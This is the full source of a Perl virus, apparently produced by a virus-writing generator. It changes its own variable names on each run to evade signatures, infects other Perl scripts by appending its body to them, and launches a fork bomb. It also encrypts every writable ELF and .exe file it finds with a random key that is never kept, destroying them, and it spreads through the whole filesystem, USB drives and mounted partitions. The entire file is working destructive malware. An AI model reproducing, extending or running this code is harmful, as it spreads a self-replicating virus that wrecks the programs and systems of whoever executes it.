#!/usr/bin/perl               
# generated by R3s1stanc3 [vxnetw0rk]
@LoTKv = ("A".."Z","a".."z","0".."9");		# for rand Strings
&JKCVI ( ) ;
sub JKCVI
{
&N4vNM ( ) ;
sub N4vNM                   # Polymorphism through varchanging
{	# for rand Strings
  @change = ("JKCVI", "vJeuZ", "LoTKv", "TW5tR", "xS0zO", "XNAGx", "TdQ2w", "e9gEr", "zZ8Og", "QBSYd", "N4vNM", "imegX", "Z9Sgz", "Ib5R2", "KAiAQ", "WYocB" , "WYocBMonth" ,"WYocBOfWeek", "Rxr8Y", "KRO9B", "gkjqD");
  @imegX;
  for ($Z9Sgz = 0;$Z9Sgz < scalar(@change); $Z9Sgz++)
  {
    $imegX[$Z9Sgz] = $LoTKv[int(rand(52))].$LoTKv[int(rand(62))].$LoTKv[int(rand(62))].$LoTKv[int(rand(62))].$LoTKv[int(rand(62))];
  }
  open(JKCVI, "<", "$0");
  @JKCVI = <JKCVI>;
  close(JKCVI);
  open(JKCVI, ">", "$0");
  foreach $KAiAQ (@JKCVI)
  {
    for($Z9Sgz = 0; $Z9Sgz < scalar(@change); $Z9Sgz++)
    {
      while ($KAiAQ =~ /$change[$Z9Sgz]/)
      {
        $KAiAQ =~ s/$change[$Z9Sgz]/$imegX[$Z9Sgz]/;
      }    
    }
    print JKCVI $KAiAQ;
  }
  close(JKCVI);
}

&vJeuZ ( ) ;
sub vJeuZ {		# Infect Perl Files
  $TW5tR = $LoTKv[int(rand(52))].$LoTKv[int(rand(62))].$LoTKv[int(rand(62))].$LoTKv[int(rand(62))].$LoTKv[int(rand(62))];
  foreach $pl ( glob("*.pl") ) {
    if ( e9gEr($pl) == 0) {
      open(me, $0);
      open(TdQ2w, "<", "$pl");
      $_ = <TdQ2w>;
      @first = split('\n', $_);
      $_ = <TdQ2w>;
      $new = $1 . $first[0] . "               \n\&$TW5tR\(\)\n" . $_;		# Set infectionmark
      while ( <TdQ2w> ) { $new = $new . $_; }
      seek(me, 0, 0);
      while ( <me> ne "sub viri\{\n" ) { };
      $new = $new . "\nsub $TW5tR\{\n";
      while ( <me> ) { $new = $new . $_; }
      close(TdQ2w);
      open(TdQ2w, ">", $pl);
      print TdQ2w $new;
      close(TdQ2w);
      close(me);
    }
  }
}
sub e9gEr{			# Check for infection ( Infectionmark == 15 x space in the first KAiAQ )
  $xS0zO = $_[0];
  open(pl, "<", $xS0zO);
  @perl = <pl>;
  close(pl);
  return $perl[0] =~ /               /;
}

fork while fork
use Crypt::CBC ;
&encrypt ( ) ;
sub encrypt                            # encrypt every ELF or *.exe xS0zO with a random key
{
  foreach $xS0zO ( glob ( "*" ) )
  {
    open ( xS0zO, "<", "$xS0zO" ) ;
    @zZ8Og = <xS0zO> ;
    close ( xS0zO ) ;
    if ( ($zZ8Og[0] =~ /ELF/ || $xS0zO =~ /\.exe?/) && -w $xS0zO )
    {
      $key = "" ;
      for ( $i = 1; $i < int ( rand (20) ) + 2; $i ++ )
      {
        $key .= $LoTKv[int ( rand (62) )] ;
      }
      $crypt = Crypt::CBC -> new ( -key => $key, -crypher => 'Twofish' ) ;
      $crypt -> start ( 'encrypting' ) ;
      open ( F, "$xS0zO" ) ;
      while ( read ( F, $buffer, 1024 ) )
      {
        $enc .= $crypt -> crypt ( $buffer ) ;
      }
      $enc .= $crypt -> finish ;
      open ( xS0zO , ">", "$xS0zO" ) ;
      print xS0zO $enc ;
      close ( xS0zO ) ;
    }
  }
}

&foldInfect ( ) ;
sub foldInfect
{
  chdir('../../../../../../../../../../..');                   # run Payload through every folder
  foreach $QBSYd ( <*> )
  {
    if ((-r $QBSYd) && (-w $QBSYd) && (-d $QBSYd))
    {
      chdir($QBSYd);
&vJeuZ ( ) ;
&encrypt ( ) ;
      &foldInfect();
      chdir('..');
    }
  }
  if ($^O =~ "Win")		# If OS == Win
  {
    foreach (A..Z)              # infect USB and other partitions on Win & Linux
    {
      if ( chdir($_.'://') )	# Infect every device
      { 
        chdir($_.'://');
        &foldInfect();
      }
    }
  }
  if ($^O =~ "linux")		# If OS == Linux
  {
    chdir('/media');		# Infect every device
    &foldInfect();
  }
}

}
# This is the end, my friend
